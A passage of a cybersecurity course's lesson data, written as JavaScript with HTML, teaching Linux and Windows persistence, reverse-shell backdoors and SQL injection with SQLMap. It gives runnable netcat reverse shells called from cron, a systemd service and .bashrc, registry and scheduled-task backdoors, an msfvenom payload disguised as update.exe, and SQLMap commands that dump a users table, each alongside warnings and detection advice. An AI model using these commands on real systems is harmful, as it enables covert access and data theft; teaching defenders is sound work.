                      <code class="text-green-400 block mb-1 font-mono">crontab -l</code>
                      <p class="text-sm text-gray-400">View existing cron jobs.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">crontab -e</code>
                      <p class="text-sm text-gray-400">Add a persistence cron job.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="text-green-400 font-mono text-sm mb-1">
                        @reboot /bin/bash -c "nc 192.168.1.10 4444 -e /bin/bash"
                      </div>
                      <p class="text-sm text-gray-400"><strong>Example Entry:</strong> Runs on every reboot. Establishes reverse shell. Very common persistence technique.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Persistence via Systemd Services</h4>
                  <p class="text-gray-300 mb-2">Systemd manages services in modern Linux systems.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">nano /etc/systemd/system/backdoor.service</code>
                      <p class="text-sm text-gray-400">Create a malicious service.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="text-green-400 font-mono text-sm mb-1">
                        <p>[Unit]</p>
                        <p>Description=System Backdoor</p>
                        <p>&nbsp;</p>
                        <p>[Service]</p>
                        <p>ExecStart=/bin/bash -c "nc 192.168.1.10 4444 -e /bin/bash"</p>
                        <p>Restart=always</p>
                        <p>&nbsp;</p>
                        <p>[Install]</p>
                        <p>WantedBy=multi-user.target</p>
                      </div>
                      <p class="text-sm text-gray-400 mt-2"><strong>Example Service File:</strong> Defines a service that runs a reverse shell and restarts automatically.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="text-green-400 font-mono text-sm mb-1">
                        <p>systemctl enable backdoor.service</p>
                        <p>systemctl start backdoor.service</p>
                      </div>
                      <p class="text-sm text-gray-400">Starts automatically at boot. Runs with high privileges. Hard to notice without auditing.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Other Persistence Methods</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-semibold mb-1">Persistence via Bash Configuration</h5>
                      <code class="text-green-400 block mb-1 font-mono">nano ~/.bashrc</code>
                      <p class="text-sm text-gray-400 mb-2">Example entry:</p>
                      <code class="text-green-400 block mb-1 font-mono">nc 192.168.1.10 4444 -e /bin/bash &</code>
                      <p class="text-sm text-gray-400">Executes when user opens terminal. Stealthy user‑level persistence.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <h5 class="text-white font-semibold mb-1">Persistence via SSH Authorized Keys</h5>
                      <div class="text-green-400 font-mono text-sm mb-1">
                        <p>mkdir -p ~/.ssh</p>
                        <p>echo "attacker_public_key" >> ~/.ssh/authorized_keys</p>
                      </div>
                      <p class="text-sm text-gray-400">Allows password‑less login. Very stealthy persistence method.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection & Mitigation</h4>
                  <p class="text-gray-300 mb-2">Security teams should monitor:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Unexpected cron entries</li>
                    <li>Unauthorized systemd services</li>
                    <li>Changes to .bashrc, .profile</li>
                    <li>New SSH keys</li>
                    <li>Suspicious outbound connections</li>
                  </ul>
                  <p class="text-gray-300 mb-2">Mitigation techniques include:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>File integrity monitoring</li>
                    <li>Least‑privilege enforcement</li>
                    <li>Regular cron/service audits</li>
                    <li>Centralized logging</li>
                    <li>EDR for Linux</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Persistence Techniques in Windows',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Persistence Techniques in Windows</h2>
          <p class="mb-4 text-gray-300">
            Persistence in Windows refers to techniques used by attackers to maintain continued access to a compromised Windows system even after a reboot, user logoff, or system update. Windows provides many built‑in mechanisms for automation and system management, and attackers frequently abuse these legitimate features to hide malicious activity. Because these mechanisms are commonly used by administrators, malicious persistence can blend in with normal system behavior.
          </p>
          <p class="mb-4 text-gray-300">
            Windows persistence techniques are heavily used in malware infections, ransomware campaigns, spyware, and advanced persistent threats (APTs). Once persistence is established, attackers can return to the system, re‑establish command‑and‑control connections, steal credentials, escalate privileges, or deploy additional malware. Many persistence methods do not require advanced exploits—just administrative privileges and poor system hardening.
          </p>
          <p class="mb-4 text-gray-300">
            From a defender’s perspective, Windows persistence is one of the most critical areas to monitor during incident response. Many successful attacks are not due to zero‑day exploits, but because persistence mechanisms were never detected or removed.
          </p>
          
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Common Windows Persistence Mechanisms</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Registry Run keys</li>
              <li>Scheduled Tasks</li>
              <li>Windows Services</li>
              <li>Startup folders</li>
              <li>WMI event subscriptions</li>
              <li>DLL search order hijacking</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Why Windows Persistence Is Widely Abused</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Windows supports many startup mechanisms</li>
              <li>Registry changes are rarely audited</li>
              <li>Scheduled tasks appear legitimate</li>
              <li>Services run with high privileges</li>
            </ul>
            <p class="mt-2 text-gray-400 text-sm">Attackers often combine persistence with reverse shells, Meterpreter sessions, or RATs.</p>
          </div>
        `,
        syntax: [
          {
            title: 'Windows Persistence Commands',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Windows Persistence Techniques</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands shown are for ethical labs, controlled environments, and defensive learning only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Registry Run Key Persistence</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"</code>
                    <p class="text-sm text-gray-400">Executes programs at user login. Common malware persistence method.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Scheduled Task Persistence</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">schtasks /create /sc onlogon /tn "SystemUpdater" /tr "C:\\backdoor.exe"</code>
                    <p class="text-sm text-gray-400">Runs on user logon. Appears legitimate. Often overlooked.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Windows Service Persistence</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">sc create SystemUpdate binPath= "C:\\backdoor.exe" start= auto</code>
                    <p class="text-sm text-gray-400">Runs at system startup. High privileges. Difficult to notice.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Startup Folder Persistence</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">copy backdoor.exe "C:\\Users\\Public\\Start Menu\\Programs\\Startup\\"</code>
                    <p class="text-sm text-gray-400">Executes when user logs in. Simple persistence method.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Metasploit Persistence Module (Conceptual)</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono text-sm">run persistence -X -i 60 -p 4444 -r 192.168.1.10</code>
                    <p class="text-sm text-gray-400">Attempts persistence automatically. Often detected by modern defenses.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection & Mitigation</h4>
                  <p class="text-gray-300 mb-2">Security teams should monitor:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Registry Run key changes</li>
                    <li>New scheduled tasks</li>
                    <li>Unauthorized services</li>
                    <li>Startup folder modifications</li>
                    <li>WMI subscriptions</li>
                  </ul>
                  <p class="text-gray-300 mb-2">Mitigation techniques include:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Registry monitoring</li>
                    <li>Application whitelisting</li>
                    <li>Endpoint Detection & Response (EDR)</li>
                    <li>Least‑privilege enforcement</li>
                    <li>Regular persistence audits</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'How to Create a Backdoor (Ethical Demo)',
        content: `
          <h2 class="text-xl font-semibold mb-3 text-white">How to Create a Backdoor (Ethical Demo)</h2>
          <div class="bg-red-900/20 border-l-4 border-red-500 p-4 mb-6">
            <h3 class="text-lg font-semibold text-red-400 mb-1">⚠️ Ethical Warning</h3>
            <p class="text-gray-300 text-sm">
              This demonstration is for <strong>educational and defensive purposes only</strong>. Never create backdoors on systems you do not own or have explicit permission to test. Unauthorized access is illegal.
            </p>
          </div>

          <div class="space-y-6">
            <p class="text-gray-300">
              Understanding how backdoors are created is essential for detecting them. In this demo, we will look at the mechanics of a simple "Reverse Shell," which is a common type of backdoor used to bypass firewalls that block incoming connections but allow outgoing ones.
            </p>

            <div>
              <h3 class="text-lg font-semibold text-white mb-3">Mechanism: Reverse Shell</h3>
              <p class="text-gray-300 mb-4">
                A reverse shell works by having the <strong>victim</strong> machine initiate the connection back to the <strong>attacker</strong>. This is effective because most firewalls block incoming traffic (preventing a "Bind Shell") but are more permissive with outgoing traffic.
              </p>
              
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-blue-400 font-medium mb-2">1. Attacker (Listener)</h4>
                  <p class="text-gray-400 text-sm mb-2">The attacker waits for a connection.</p>
                  <code class="text-green-400 block font-mono text-sm bg-black/30 p-2 rounded">nc -lvnp 4444</code>
                  <ul class="text-gray-500 text-xs mt-2 space-y-1">
                    <li><strong>-l</strong>: Listen mode</li>
                    <li><strong>-v</strong>: Verbose</li>
                    <li><strong>-n</strong>: No DNS lookup</li>
                    <li><strong>-p</strong>: Port 4444</li>
                  </ul>
                </div>

                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-red-400 font-medium mb-2">2. Victim (Payload)</h4>
                  <p class="text-gray-400 text-sm mb-2">The victim connects to the attacker.</p>
                  <code class="text-green-400 block font-mono text-sm bg-black/30 p-2 rounded">nc -e /bin/bash 192.168.1.10 4444</code>
                  <p class="text-gray-500 text-xs mt-2">
                    (On Windows: <code class="text-gray-400">nc -e cmd.exe ...</code>)
                  </p>
                </div>
              </div>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-3">Creating a Persistent Backdoor (Conceptual)</h3>
              <p class="text-gray-300 mb-4">
                Attackers often use tools like <strong>Metasploit (msfvenom)</strong> to create executable backdoors that can be hidden in legitimate files.
              </p>
              
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-purple-400 font-medium mb-2">Generating a Payload with msfvenom</h4>
                <code class="text-green-400 block font-mono text-sm mb-2 break-all">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o update.exe</code>
                <p class="text-gray-400 text-sm mt-2">
                  This command creates a malicious executable (<code class="text-gray-300">update.exe</code>) that, when run by the victim, connects back to the attacker's IP on port 4444.
                </p>
              </div>
            </div>

            <div class="bg-blue-900/20 p-4 rounded border-l-4 border-blue-500">
              <h3 class="text-lg font-semibold text-white mb-2">Defensive Perspective: How to Detect This?</h3>
              <ul class="list-disc list-inside space-y-2 text-gray-300 text-sm">
                <li>
                  <strong class="text-blue-300">Network Monitoring:</strong> Look for outbound connections to unknown IP addresses on non-standard ports.
                </li>
                <li>
                  <strong class="text-blue-300">Process Analysis:</strong> Use tools like Task Manager or Process Hacker to find processes (like <code class="text-gray-400">nc.exe</code> or strange names) spawning shells (<code class="text-gray-400">cmd.exe</code>, <code class="text-gray-400">bash</code>).
                </li>
                <li>
                  <strong class="text-blue-300">Firewall Rules:</strong> Restrict outbound traffic to only necessary ports (HTTP/HTTPS, DNS).
                </li>
              </ul>
            </div>
          </div>
        `,
        duration: '15 min'
      }
    ]
  },
  {
    id: 'module-4',
    title: 'Module 4: SQL Injection & Bug Bounty Introduction',
    duration: '1 week',
    description: 'Master SQL injection techniques and learn the basics of bug bounty hunting.',
    lessons: [
      {
        title: 'What is SQL Injection?',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">What is SQL Injection?</h2>
          <p class="mb-4 text-gray-300">
            SQL Injection (SQLi) is one of the most critical and historically dangerous web application vulnerabilities. It occurs when an application improperly handles user input and directly inserts that input into SQL queries without proper validation or sanitization. This allows an attacker to manipulate database queries, potentially gaining unauthorized access to sensitive data or full control over the backend database.
          </p>
          <p class="mb-4 text-gray-300">
            At its core, SQL Injection exploits the trust relationship between an application and its database. Web applications commonly use SQL to perform operations such as user authentication, data retrieval, updates, and deletions. When user input (such as login fields, search boxes, or URL parameters) is not securely handled, attackers can inject malicious SQL code that alters the intended query logic.
          </p>
          <p class="mb-4 text-gray-300">
            For example, instead of an application checking whether a username and password are valid, a crafted input could force the database to always return true, bypassing authentication entirely. In more severe cases, SQL Injection can allow attackers to dump entire databases, modify records, create new admin accounts, or even execute system‑level commands depending on database configuration.
          </p>
          
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Why SQL Injection Remains Relevant</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Legacy applications still exist</li>
              <li>Developers misuse dynamic queries</li>
              <li>Input validation is often incomplete</li>
              <li>ORMs and frameworks are misconfigured</li>
            </ul>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Impact of SQL Injection Attacks</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Authentication bypass</li>
              <li>Sensitive data leakage</li>
              <li>Data manipulation or deletion</li>
              <li>Privilege escalation</li>
              <li>Complete application compromise</li>
            </ul>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: SQLMap',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">SQLMap Commands</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands are for authorized labs, educational environments, and defensive testing only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">What is SQLMap?</h4>
                  <p class="text-gray-300 mb-2">SQLMap is an automated SQL Injection testing tool used to:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Detect SQL Injection vulnerabilities</li>
                    <li>Exploit injectable parameters</li>
                    <li>Extract database information</li>
                    <li>Assist in security testing</li>
                  </ul>
                  <p class="text-gray-400 text-sm">It supports multiple databases including MySQL, PostgreSQL, MSSQL, Oracle, and more.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">SQLMap Usage Examples</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1"</code>
                      <p class="text-sm text-gray-400"><strong>Basic Scan:</strong> Tests URL parameter for SQL Injection. Automatically detects vulnerability.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --dbs</code>
                      <p class="text-sm text-gray-400"><strong>Using SQLMap with GET Parameters:</strong> Enumerates available databases. Confirms successful SQL Injection.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/login.php" --data="username=admin&password=pass"</code>
                      <p class="text-sm text-gray-400"><strong>Using SQLMap with POST Data:</strong> Tests POST‑based inputs. Common for login forms.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" -D testdb --tables</code>
                      <p class="text-sm text-gray-400"><strong>Database Enumeration Example:</strong> Lists tables in selected database.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Prevention & Defense</h4>
                  <p class="text-gray-300 mb-2">SQL Injection can be prevented by:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Using prepared statements</li>
                    <li>Parameterized queries</li>
                    <li>Input validation and sanitization</li>
                    <li>Least‑privileged database accounts</li>
                    <li>Web Application Firewalls (WAFs)</li>
                  </ul>
                  <p class="text-gray-300 mb-2 mt-4">Security teams should also:</p>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Perform regular code audits</li>
                    <li>Conduct penetration testing</li>
                    <li>Monitor database query behavior</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Types of SQL Injection (Union, Blind, Error-Based)',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">Understanding SQL Injection Types</h4>
              <p class="text-gray-300 mb-4">SQL Injection is not a single technique; it exists in multiple forms, each exploiting how a web application handles database errors, responses, and logic. In bug bounty hunting and penetration testing, recognizing the type of SQL Injection often determines whether exploitation is easy, difficult, or even possible.</p>
              <p class="text-gray-300 mb-4">The three most commonly encountered SQL Injection types are Union‑Based SQL Injection, Error‑Based SQL Injection, and Blind SQL Injection. Each type relies on a different method of extracting information from the database.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">1. Union‑Based SQL Injection</h4>
              <p class="text-gray-300 mb-2">Union‑based SQL Injection occurs when an attacker uses the SQL UNION operator to combine the results of a malicious query with the results of a legitimate query. This allows the attacker to directly retrieve data from other database tables within the application’s normal response.</p>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
                <p class="text-gray-300 mb-2"><strong>Why it's dangerous:</strong> Usually the easiest to exploit because the attacker can immediately see database contents (usernames, passwords, etc.) in the web page response.</p>
                <p class="text-gray-300"><strong>Requirements:</strong></p>
                <ul class="list-disc list-inside text-gray-300 space-y-1 ml-2">
                  <li>The application displays database query results</li>
                  <li>The number of columns matches</li>
                  <li>The data types are compatible</li>
                </ul>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">2. Error‑Based SQL Injection</h4>
              <p class="text-gray-300 mb-2">Error‑based SQL Injection relies on database error messages to extract information. When an attacker sends a crafted input, the database throws detailed error messages that reveal valuable information such as database type, version, table names, column names, and query structure.</p>
              <p class="text-gray-300 mb-4">This occurs when applications display raw database errors instead of handling them securely. Even if data is not directly shown, error messages can map the database structure.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">3. Blind SQL Injection</h4>
              <p class="text-gray-300 mb-2">Blind SQL Injection is used when the application does not display query results or error messages. Instead, attackers infer information based on the application’s behavior, such as page load success/failure, response content changes, or time delays.</p>
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
                <p class="text-gray-300 mb-2"><strong>Two main types:</strong></p>
                <ul class="list-disc list-inside text-gray-300 space-y-1 ml-2">
                  <li><strong>Boolean‑based blind SQLi:</strong> Infers data based on true/false responses (e.g., page loads vs. 404).</li>
                  <li><strong>Time‑based blind SQLi:</strong> Infers data based on time delays (e.g., using sleep functions).</li>
                </ul>
                <p class="text-gray-300 mt-2">Blind SQLi is slower and more complex but extremely powerful and common in modern applications.</p>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why Understanding SQLi Types Matters</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Choose the correct exploitation technique</li>
                <li>Use tools like SQLMap effectively</li>
                <li>Accurately report vulnerabilities</li>
                <li>Apply proper defensive controls</li>
              </ul>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: SQLMap',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">SQLMap Commands</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands are for authorized labs, ethical hacking practice, and defensive learning only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detecting SQL Injection Type</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --level=3 --risk=2</code>
                    <p class="text-sm text-gray-400">Tests for multiple SQLi techniques and automatically detects injection type.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Union‑Based SQL Injection Enumeration</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --technique=U --dbs</code>
                    <p class="text-sm text-gray-400">Forces UNION‑based testing and extracts databases directly.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Error‑Based SQL Injection Testing</h4>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333] mb-4">
                    <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --technique=E</code>
                    <p class="text-sm text-gray-400">Exploits error messages to identify database structure.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Blind SQL Injection</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --technique=B</code>
                      <p class="text-sm text-gray-400"><strong>Boolean-Based:</strong> Uses true/false logic. No visible data leakage.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --technique=T --time-sec=5</code>
                      <p class="text-sm text-gray-400"><strong>Time-Based:</strong> Uses response delays. Effective when output is hidden.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Prevention & Defense</h4>
                  <p class="text-gray-300 mb-2">To protect against all SQL Injection types:</p>
                  <ul class="list-disc list-inside text-gray-300 space-y-1">
                    <li>Use parameterized queries</li>
                    <li>Disable verbose error messages</li>
                    <li>Implement input validation</li>
                    <li>Apply WAF rules</li>
                    <li>Monitor unusual query behavior</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'SQLMap Tool Basics',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">Introduction to SQLMap</h4>
              <p class="text-gray-300 mb-4">SQLMap is one of the most powerful and widely used automated SQL Injection testing tools in cyber security. It is an open‑source tool written in Python and comes pre‑installed in Kali Linux, making it a standard utility for penetration testers and bug bounty hunters. SQLMap automates the process of detecting, exploiting, and enumerating SQL Injection vulnerabilities, which would otherwise require deep manual effort and time.</p>
              <p class="text-gray-300 mb-4">At a conceptual level, SQLMap works by sending carefully crafted SQL payloads to a target application and analyzing the responses. Based on differences in server behavior, response content, error messages, or response time, SQLMap determines whether the application is vulnerable and what type of SQL Injection exists.</p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Capabilities & Features</h4>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Supported Databases</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>MySQL, PostgreSQL</li>
                    <li>Microsoft SQL Server</li>
                    <li>Oracle, SQLite</li>
                    <li>IBM DB2, Sybase, etc.</li>
                  </ul>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h5 class="text-white font-medium mb-2">Injection Points</h5>
                  <ul class="list-disc list-inside text-gray-300 space-y-1 text-sm">
                    <li>URL parameters (GET)</li>
                    <li>POST data (forms)</li>
                    <li>HTTP headers & Cookies</li>
                    <li>JSON requests</li>
                  </ul>
                </div>
              </div>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Why SQLMap Is Important</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1 mb-4">
                <li>Saves time during vulnerability assessment</li>
                <li>Automatically adapts to different SQLi types</li>
                <li>Extracts large amounts of data efficiently</li>
                <li>Helps verify the real impact of SQL Injection</li>
                <li>Produces reliable proof‑of‑concept results</li>
              </ul>
              <p class="text-yellow-400 text-sm bg-[#2d2d20] p-3 rounded border border-yellow-800">
                <strong>Note:</strong> Over‑reliance on automation is dangerous. Skilled testers use SQLMap after manual confirmation, not as a blind scanner.
              </p>
            </div>

            <div>
              <h4 class="text-lg font-semibold text-white mb-3">Defense Perspective</h4>
              <p class="text-gray-300 mb-2">From a defensive standpoint, understanding SQLMap is crucial because many attackers use it directly or indirectly. Security teams must recognize SQLMap traffic patterns, user‑agent behavior, and exploitation methods in order to detect and block automated attacks.</p>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Kali Linux Tool: SQLMap',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Basic SQLMap Commands</h4>
                  <p class="text-gray-300 mb-4">⚠️ Commands shown are for authorized testing, labs, and educational purposes only.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Initial Setup & Scanning</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap --version</code>
                      <p class="text-sm text-gray-400">Confirms installation and displays current version.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1"</code>
                      <p class="text-sm text-gray-400"><strong>Basic Vulnerability Test:</strong> Tests URL parameter for SQL Injection and automatically detects vulnerability.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --level=5 --risk=3</code>
                      <p class="text-sm text-gray-400"><strong>Increase Scan Depth:</strong> Performs aggressive testing to find deeper injection points.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Database Enumeration</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" --dbs</code>
                      <p class="text-sm text-gray-400">Lists all available databases to confirm successful exploitation.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" -D usersdb --tables</code>
                      <p class="text-sm text-gray-400">Lists tables in the selected database (e.g., 'usersdb').</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Data Extraction</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" -D usersdb -T users --columns</code>
                      <p class="text-sm text-gray-400">Displays column names from the 'users' table to identify sensitive fields.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono text-sm break-all">sqlmap -u "http://testsite.com/page.php?id=1" -D usersdb -T users --dump</code>
                      <p class="text-sm text-gray-400"><strong>Dump Table Data:</strong> Extracts table data. Used for impact demonstration.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection & Defense</h4>
                  <p class="text-gray-300 mb-2">Security teams can detect SQLMap by:</p>
                  <ul class="list-disc list-inside text-gray-300 space-y-1">
                    <li>Identifying SQLMap user‑agent strings</li>
                    <li>Monitoring repetitive payload patterns</li>
                    <li>Observing abnormal request frequency</li>
                    <li>Using WAF anomaly detection</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Manual SQL Injection Testing',
        content: `
          <div class="space-y-6">
            <div>
              <h4 class="text-lg font-semibold text-white mb-2">The Art of Manual SQL Injection</h4>
              <p class="text-gray-300 mb-4">Manual SQL Injection testing is the process of identifying and exploiting SQL Injection vulnerabilities without relying on automated tools. While tools like SQLMap are powerful, manual testing is a core skill for penetration testers and bug bounty hunters because it helps them understand application logic, bypass security controls, and find vulnerabilities that automation may miss.</p>
